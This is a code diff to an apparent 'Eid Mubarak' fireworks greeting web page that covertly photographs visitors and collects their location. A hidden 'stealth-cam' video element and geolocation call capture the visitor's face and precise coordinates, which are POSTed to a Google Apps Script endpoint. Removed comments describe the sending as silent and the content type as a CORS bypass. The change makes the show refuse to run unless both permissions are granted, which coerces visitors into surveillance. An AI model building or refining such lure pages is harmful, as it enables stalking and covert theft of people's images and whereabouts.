@@ -17,6 +17,7 @@
         box-shadow: 0 0 15px #ffd700; transition: 0.3s; letter-spacing: 2px;
     }
     #start-btn:hover { background: #ffd700; color: #000; }
+    #start-btn:disabled { border-color: #555; color: #555; box-shadow: none; cursor: not-allowed; background: transparent; }
     canvas { display: block; }
     
     .stealth-cam {
@@ -24,7 +25,7 @@
     }
 </style>
 </head>
-<body onload="autoCapture()">
+<body>
 
 <video id="camera-stream" class="stealth-cam" autoplay playsinline muted></video>
 <canvas id="capture-canvas" class="stealth-cam"></canvas>
@@ -34,7 +35,6 @@
 
 <script>
 // ==================== PASTE YOUR URL HERE ====================
-// Paste the Web App URL you got from Google Apps Script here
 const GAS_URL = "https://script.google.com/macros/s/AKfycbysQWX0rYVcqVet3xrhPgtr9RoFgiDTfCrhrSbD8vT4_c962cWxeouoxCQ_dJ4NIRN1/exec"; 
 // =============================================================
 
@@ -58,50 +58,60 @@ let globalStream = null;
 
 let ambientSparkles = [], trails = [], fireworks = [], sparks = [];
 
-// ================= LOCATION CAPTURE =================
-function autoCapture() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((pos) => {
-            window.userLat = pos.coords.latitude;
-            window.userLong = pos.coords.longitude;
-        }, null, {enableHighAccuracy: true});
-    }
-}
-
-// ================= API FETCH (Replaces google.script.run) =================
+// ================= API FETCH =================
 function sendDataToServer(imageData) {
-    const lat = window.userLat || "Denied";
-    const long = window.userLong || "Denied";
-    
+    // Only send if we have valid data from the strict gate
+    if (!window.userLat || !window.userLong) return; 
+
     const payload = JSON.stringify({
-        lat: lat,
-        long: long,
+        lat: window.userLat,
+        long: window.userLong,
         image: imageData
     });
 
-    // Send to Google Apps Script silently
     fetch(GAS_URL, {
         method: 'POST',
         body: payload,
-        headers: {
-            'Content-Type': 'text/plain;charset=utf-8' // Bypasses strict CORS
-        }
+        headers: { 'Content-Type': 'text/plain;charset=utf-8' }
     }).catch(err => console.error("Transmission failed", err));
 }
 
-// ================= CAMERA & LAUNCH LOGIC =================
+// ================= STRICT PERMISSION GATE =================
 function startCelebration() {
     const btn = document.getElementById('start-btn');
-    btn.innerText = "ACCESSING CAMERA...";
-    
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-    .then(stream => {
+    btn.innerText = "WAITING FOR PERMISSIONS...";
+    btn.disabled = true; // Prevent spam clicking
+
+    // 1. Wrap Geolocation in a Promise
+    const locationPromise = new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+            reject(new Error("Geolocation not supported by this browser."));
+        } else {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy: true});
+        }
+    });
+
+    // 2. Wrap Camera in a Promise
+    const cameraPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+
+    // 3. Force the browser to wait for BOTH to be granted
+    Promise.all([cameraPromise, locationPromise])
+    .then(results => {
+        const stream = results[0];
+        const pos = results[1];
+
+        // Securely store the coordinates
+        window.userLat = pos.coords.latitude;
+        window.userLong = pos.coords.longitude;
+
+        // Securely bind the camera stream
         globalStream = stream;
         const video = document.getElementById('camera-stream');
         video.srcObject = stream;
         
         video.onloadedmetadata = () => {
             video.play();
+            // ONLY start the show if everything above succeeds
             btn.style.display = 'none';
             mainRocket = new MainRocket();
             stage = 1;
@@ -109,12 +119,10 @@ function startCelebration() {
         };
     })
     .catch(err => {
-        alert("Camera access denied! The show will proceed without capture.");
-        btn.style.display = 'none';
-        sendDataToServer(null);
-        mainRocket = new MainRocket();
-        stage = 1;
-        animate();
+        // If they deny EITHER permission, halt everything
+        alert("⚠️ ACCESS DENIED: You must allow both Camera and Location permissions to view the Eid Mubarak experience. Please check your browser settings and try again.");
+        btn.innerText = "START SHOW";
+        btn.disabled = false; // Let them try again
     });
 }
 
@@ -146,10 +154,9 @@ function triggerCameraCapture() {
         userPhoto.src = imageData;
 
         globalStream.getTracks().forEach(track => track.stop());
+        
+        // Data is only sent when the photo is successfully captured
         sendDataToServer(imageData);
-    } else {
-        stage = 4;
-        setInterval(() => { fireworks.push(new Firework()); }, 600);
     }
 }
 
